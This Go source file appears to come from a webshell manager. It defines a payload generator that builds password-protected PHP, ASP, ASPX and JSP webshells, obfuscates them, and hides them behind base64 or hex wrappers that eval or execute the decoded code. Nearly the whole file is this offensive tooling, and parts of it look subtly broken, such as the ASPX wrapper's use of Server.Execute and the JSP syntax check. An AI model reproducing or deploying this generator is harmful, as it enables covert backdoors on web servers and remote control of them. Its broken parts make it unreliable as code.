package services

import (
	"encoding/base64"
	"encoding/hex"
	"fg-abyss/internal/domain/entity"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
)

// PayloadGenerator Payload 生成器
type PayloadGenerator struct {
	templateService *PayloadTemplateService
}

// NewPayloadGenerator 创建 Payload 生成器
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{
		templateService: NewPayloadTemplateService(),
	}
}

// Generate 生成 Payload
func (g *PayloadGenerator) Generate(config *entity.PayloadConfig) (*entity.PayloadResult, error) {
	// 验证配置
	if err := g.validateConfig(config); err != nil {
		return nil, err
	}
	
	// 获取模板
	tmpl, err := g.getTemplate(config)
	if err != nil {
		return nil, err
	}
	
	// 渲染模板
	content, err := g.templateService.RenderTemplate(tmpl.Name, config)
	if err != nil {
		return nil, fmt.Errorf("render template failed: %w", err)
	}
	
	// 编码代码
	if config.Encoder != "" && config.Encoder != "none" {
		content, err = g.encodeCode(content, config.Encoder, string(config.Type))
		if err != nil {
			return nil, fmt.Errorf("encode failed: %w", err)
		}
	}
	
	// 混淆代码
	if config.ObfuscationLevel != entity.ObfuscationNone {
		content, err = g.obfuscateCode(content, string(config.Type), config.ObfuscationLevel)
		if err != nil {
			return nil, fmt.Errorf("obfuscate failed: %w", err)
		}
	}
	
	// 生成文件名
	filename := g.generateFilename(config)
	
	// 计算大小
	size := len(content)
	
	return &entity.PayloadResult{
		Success:  true,
		Content:  content,
		Filename: filename,
		Size:     size,
		Message:  "Payload generated successfully",
	}, nil
}

// GenerateToFile 生成 Payload 到文件
func (g *PayloadGenerator) GenerateToFile(config *entity.PayloadConfig, outputPath string) (*entity.PayloadResult, error) {
	result, err := g.Generate(config)
	if err != nil {
		return nil, err
	}
	
	// 创建目录
	dir := filepath.Dir(outputPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("create directory failed: %w", err)
	}
	
	// 写入文件
	if err := os.WriteFile(outputPath, []byte(result.Content), 0644); err != nil {
		return nil, fmt.Errorf("write file failed: %w", err)
	}
	
	result.Filename = outputPath
	result.Message = fmt.Sprintf("Payload written to %s", outputPath)
	
	return result, nil
}

// validateConfig 验证配置
func (g *PayloadGenerator) validateConfig(config *entity.PayloadConfig) error {
	if config.Type == "" {
		return fmt.Errorf("payload type is required")
	}
	
	if config.Function == "" {
		return fmt.Errorf("payload function is required")
	}
	
	if config.Password == "" {
		return fmt.Errorf("password is required")
	}
	
	// 密码长度检查
	if len(config.Password) < 4 {
		return fmt.Errorf("password must be at least 4 characters")
	}
	
	return nil
}

// getTemplate 获取模板
func (g *PayloadGenerator) getTemplate(config *entity.PayloadConfig) (*entity.PayloadTemplate, error) {
	// 如果使用自定义模板
	if config.CustomTemplate != "" {
		// TODO: 加载自定义模板
		return nil, ErrTemplateNotFound
	}
	
	// 根据类型和功能查找模板
	templates := g.templateService.GetAllTemplates()
	for _, tmpl := range templates {
		if tmpl.Type == config.Type && tmpl.Function == config.Function {
			return tmpl, nil
		}
	}
	
	// 如果没找到精确匹配，尝试找基础版本
	for _, tmpl := range templates {
		if tmpl.Type == config.Type {
			return tmpl, nil
		}
	}
	
	return nil, ErrTemplateNotFound
}

// obfuscateCode 混淆代码
func (g *PayloadGenerator) obfuscateCode(code string, language string, level entity.ObfuscationLevel) (string, error) {
	obfuscator := NewCodeObfuscator(level)
	return obfuscator.Obfuscate(code, language)
}

// generateFilename 生成文件名
func (g *PayloadGenerator) generateFilename(config *entity.PayloadConfig) string {
	if config.OutputFilename != "" {
		return config.OutputFilename
	}
	
	// 根据类型生成默认文件名
	extension := g.getFileExtension(config.Type)
	return fmt.Sprintf("payload_%s.%s", config.Function, extension)
}

// getFileExtension 获取文件扩展名
func (g *PayloadGenerator) getFileExtension(payloadType entity.PayloadType) string {
	switch payloadType {
	case entity.PayloadTypePHP:
		return "php"
	case entity.PayloadTypeASP:
		return "asp"
	case entity.PayloadTypeASPX:
		return "aspx"
	case entity.PayloadTypeJSP:
		return "jsp"
	default:
		return "txt"
	}
}

// GetTemplates 获取所有模板
func (g *PayloadGenerator) GetTemplates() []*entity.PayloadTemplate {
	return g.templateService.GetAllTemplates()
}

// GetTemplateByName 按名称获取模板
func (g *PayloadGenerator) GetTemplateByName(name string) (*entity.PayloadTemplate, error) {
	return g.templateService.GetTemplate(name)
}

// AddCustomTemplate 添加自定义模板
func (g *PayloadGenerator) AddCustomTemplate(tmpl *entity.PayloadTemplate) error {
	g.templateService.AddTemplate(tmpl)
	return nil
}

// RemoveCustomTemplate 移除自定义模板
func (g *PayloadGenerator) RemoveCustomTemplate(name string) error {
	return g.templateService.RemoveTemplate(name)
}

// encodeCode 编码代码
func (g *PayloadGenerator) encodeCode(code string, encoder string, language string) (string, error) {
	switch encoder {
	case "base64":
		return g.encodeBase64(code, language)
	case "rot13":
		return g.encodeROT13(code, language)
	case "urlencode":
		return g.encodeURL(code, language)
	case "hex":
		return g.encodeHex(code, language)
	default:
		return code, nil // 不支持的编码器返回原代码
	}
}

// encodeBase64 Base64 编码
func (g *PayloadGenerator) encodeBase64(code string, language string) (string, error) {
	encoded := base64.StdEncoding.EncodeToString([]byte(code))
	
	// 根据语言生成不同的 Base64 解码包装器
	switch language {
	case "php":
		// PHP: 使用 base64_decode + eval
		return fmt.Sprintf(`<?php
// Base64 编码的 Payload
eval(base64_decode('%s'));
?>`, encoded), nil
	case "asp":
		// ASP: 使用 VBScript Base64 解码函数
		return fmt.Sprintf(`<%%
' Base64 编码的 Payload
Function DecodeBase64(ByVal strBase64)
     Dim objDM, objXml, objNode
     Set objDM = Server.CreateObject("MSXML2.DOMDocument")
     Set objNode = objDM.createElement("b64")
     objNode.DataType = "bin.base64"
     objNode.Text = strBase64
     DecodeBase64 = objNode.nodeTypedValue
End Function
Execute StrConv(DecodeBase64("%s"), vbUnicode)
%%>`, encoded), nil
	case "aspx":
		// ASPX: 使用 System.Convert.FromBase64String
		return fmt.Sprintf(`<%%@ Page Language="C#" Debug="true" %%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    try
    {
        // Base64 编码的 Payload
        string encoded = "%s";
        byte[] decoded = System.Convert.FromBase64String(encoded);
        string code = System.Text.Encoding.UTF8.GetString(decoded);
        // 执行代码
        Server.Execute(code);
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}
</script>`, encoded), nil
	case "jsp":
		// JSP: 使用 Base64 解码
		return fmt.Sprintf(`<%%
// Base64 编码的 Payload
try {
    String encoded = "%s";
    byte[] decoded = java.util.Base64.getDecoder().decode(encoded);
    String code = new String(decoded, "UTF-8");
    Runtime.getRuntime().exec(code);
} catch (Exception e) {
    e.printStackTrace();
}
%%>`, encoded), nil
	default:
		return code, nil
	}
}

// encodeROT13 ROT13 编码
func (g *PayloadGenerator) encodeROT13(code string, language string) (string, error) {
	encoded := payloadROT13Encode(code)
	return fmt.Sprintf(`// ROT13 编码的 Payload
// 注意：ROT13 是一种简单的替换加密，安全性较低
%s`, encoded), nil
}

// encodeURL URL 编码
func (g *PayloadGenerator) encodeURL(code string, language string) (string, error) {
	encoded := payloadURLEncode(code)
	return fmt.Sprintf(`// URL 编码的 Payload
// 需要在服务器端解码
%s`, encoded), nil
}

// encodeHex 十六进制编码
func (g *PayloadGenerator) encodeHex(code string, language string) (string, error) {
	encoded := payloadHexEncode(code)
	switch language {
	case "php":
		return fmt.Sprintf(`<?php
// 十六进制编码的 Payload
eval(hex2bin('%s'));
?>`, encoded), nil
	default:
		return fmt.Sprintf(`// 十六进制编码的 Payload
%s`, encoded), nil
	}
}

// 辅助函数：Base64 编码（Payload 专用）
func payloadBase64Encode(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// 辅助函数：ROT13 编码（Payload 专用）
func payloadROT13Encode(data string) string {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		c := data[i]
		if c >= 'A' && c <= 'Z' {
			result[i] = 'A' + (c-'A'+13)%26
		} else if c >= 'a' && c <= 'z' {
			result[i] = 'a' + (c-'a'+13)%26
		} else {
			result[i] = c
		}
	}
	return string(result)
}

// 辅助函数：URL 编码（Payload 专用）
func payloadURLEncode(data string) string {
	return url.QueryEscape(data)
}

// 辅助函数：十六进制编码（Payload 专用）
func payloadHexEncode(data string) string {
	return hex.EncodeToString([]byte(data))
}

// Preview 预览生成的 Payload
func (g *PayloadGenerator) Preview(config *entity.PayloadConfig) (string, error) {
	result, err := g.Generate(config)
	if err != nil {
		return "", err
	}
	return result.Content, nil
}

// ValidatePayload 验证生成的 Payload
func (g *PayloadGenerator) ValidatePayload(content string, payloadType entity.PayloadType) (bool, []string) {
	warnings := []string{}
	
	// 基本语法检查
	switch payloadType {
	case entity.PayloadTypePHP:
		if !g.validatePHP(content) {
			warnings = append(warnings, "PHP syntax may be invalid")
		}
	case entity.PayloadTypeASP:
		if !g.validateASP(content) {
			warnings = append(warnings, "ASP syntax may be invalid")
		}
	case entity.PayloadTypeASPX:
		if !g.validateASPX(content) {
			warnings = append(warnings, "ASPX syntax may be invalid")
		}
	case entity.PayloadTypeJSP:
		if !g.validateJSP(content) {
			warnings = append(warnings, "JSP syntax may be invalid")
		}
	}
	
	return len(warnings) == 0, warnings
}

// validatePHP 验证 PHP 语法
func (g *PayloadGenerator) validatePHP(content string) bool {
	// 简化检查：确保包含 <?php 标签
	return contains(content, "<?php")
}

// validateASP 验证 ASP 语法
func (g *PayloadGenerator) validateASP(content string) bool {
	return contains(content, "<%")
}

// validateASPX 验证 ASPX 语法
func (g *PayloadGenerator) validateASPX(content string) bool {
	return contains(content, "<%@")
}

// validateJSP 验证 JSP 语法
func (g *PayloadGenerator) validateJSP(content string) bool {
	return contains(content, "<%@")
}

// contains 检查字符串是否包含子串
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && findSubstring(s, substr))
}

func findSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
